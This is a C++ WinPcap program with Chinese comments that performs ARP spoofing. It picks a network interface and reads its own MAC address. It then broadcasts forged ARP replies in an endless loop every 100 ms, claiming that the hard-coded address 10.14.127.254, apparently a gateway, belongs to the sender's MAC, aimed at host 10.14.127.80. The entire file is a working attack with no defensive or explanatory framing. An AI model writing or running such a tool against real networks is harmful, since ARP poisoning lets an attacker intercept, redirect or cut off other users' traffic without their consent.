// ARP.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#pragma pack(1)



struct ip_address
{
	u_char byte1;
	u_char byte2;
	u_char byte3;
	u_char byte4;
};

union ipAddr
{
	u_long ip;
	ip_address ip_s;
};

struct _ARP_HEAD {
	u_short hardware_type; //硬件类型  0x0001  
	u_short protocal_type; //协议类型  0x0800  
	u_char hardware_addr_len; //硬件地址长度  06  
	u_char protocal_addr_len; //协议地址长度  04  
	USHORT operation_field; //操作字段 01 request ,  02 response  
	UCHAR source_mac_addr[6]; //源mac地址 will be filled in runtime  
	u_long source_ip_addr; //源ip地址 localhost  
	UCHAR dest_mac_addr[6]; //目的max地址 00:00:00:00:00:00  
	u_long dest_ip_addr; //目的ip地址   
};

//  
struct _ETHER_HEAD {
	UCHAR dest_mac_addr[6];  //目的 mac 地址  
	UCHAR source_mac_addr[6]; //源 mac 地址  
	USHORT type;  //帧类型  
};

struct _ARP{  
    _ETHER_HEAD eh;  
    _ARP_HEAD ah;  
    char padding[18]; // to make sure the sizeof(BYTES) >= 60   
};  

_ARP makeArpPack(u_char* mac, u_long sIp, u_long tIp);
int main()
{
	pcap_if_t *alldevs;
	pcap_if_t *d;
	int inum;
	int i = 0;
	pcap_t *adhandle;
	char errbuf[PCAP_ERRBUF_SIZE];
	char packet_filter[] = "arp";

	/* Retrieve the device list on the local machine */
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}

	/* Print the list */
	for (d = alldevs; d; d = d->next)
	{
		printf("%d. %s", ++i, d->name);
		if (d->description)
			printf(" (%s)\n", d->description);
		else
			printf(" (No description available)\n");
	}

	if (i == 0)
	{
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
		return -1;
	}

	printf("Enter the interface number (1-%d):", i);
	scanf_s("%d", &inum);

	if (inum < 1 || inum > i)
	{
		printf("\nInterface number out of range.\n");
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return -1;
	}

	/* Jump to the selected adapter */
	for (d = alldevs, i = 0; i< inum - 1; d = d->next, i++);

	/* Open the device */
	if ((adhandle = pcap_open(d->name,          // name of the device
		65536,            // portion of the packet to capture
				  // 65536 guarantees that the whole packet will be captured on all the link layers
		0,    // non-promiscuous mode
		1000,             // read timeout
		NULL,             // authentication on the remote machine
		errbuf            // error buffer
	)) == NULL)
	{
		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return -1;
	}
	if(pcap_datalink(adhandle)!=DLT_EN10MB)
	{
		printf("Not on Ethernet networks\n");
		pcap_freealldevs(alldevs);
		return -1;
	}

	u_int netmask;

	if (d->addresses != NULL)
		/* Retrieve the mask of the first address of the interface */
		netmask = ((struct sockaddr_in *)(d->addresses->netmask))->sin_addr.S_un.S_addr;
	else
		/* If the interface is without addresses we suppose to be in a C class network */
		netmask = 0xffffff;

	LPADAPTER lpAdapter;

	lpAdapter = PacketOpenAdapter(d->name+8);

	PPACKET_OID_DATA data;
	data = (PPACKET_OID_DATA)malloc(6 + sizeof(PACKET_OID_DATA));
	data->Oid = OID_802_3_CURRENT_ADDRESS;
	data->Length = 6;
	PacketRequest(lpAdapter, FALSE, data);
	u_char mac[6];
	memcpy(mac, (u_char*)(data->Data), 6);
	ipAddr fakeIp_s;
	fakeIp_s.ip = inet_addr("10.14.127.254");
	u_long targetIp = inet_addr("10.14.127.80");
	int count = 0;
	while(1)
	{
		_ARP packet = makeArpPack(mac, fakeIp_s.ip, targetIp);//构建包
		pcap_sendpacket(adhandle, (u_char*)&packet, 60);
		printf("Send\n");
		Sleep(100);
	}
	
	return 0;
}


_ARP makeArpPack(u_char* mac,u_long sIp,u_long tIp)
{
	_ARP pack;
	memset(pack.eh.dest_mac_addr, 0xff, 6);//目的MAC
	memcpy(pack.eh.source_mac_addr, mac, 6);//源MAC
	pack.eh.type = htons(0x0806);//ARP
	pack.ah.hardware_type = htons(0x0001);//Ethernet
	pack.ah.hardware_addr_len = 0x06;
	pack.ah.protocal_type = htons(0x0800);//IP
	pack.ah.protocal_addr_len = 0x04;
	pack.ah.operation_field = htons(0x0002);
	memcpy(pack.ah.source_mac_addr, mac, 6);
	pack.ah.source_ip_addr = sIp;
	pack.ah.dest_ip_addr = tIp;
	memset(pack.padding, 0, 18);
	return pack;
}
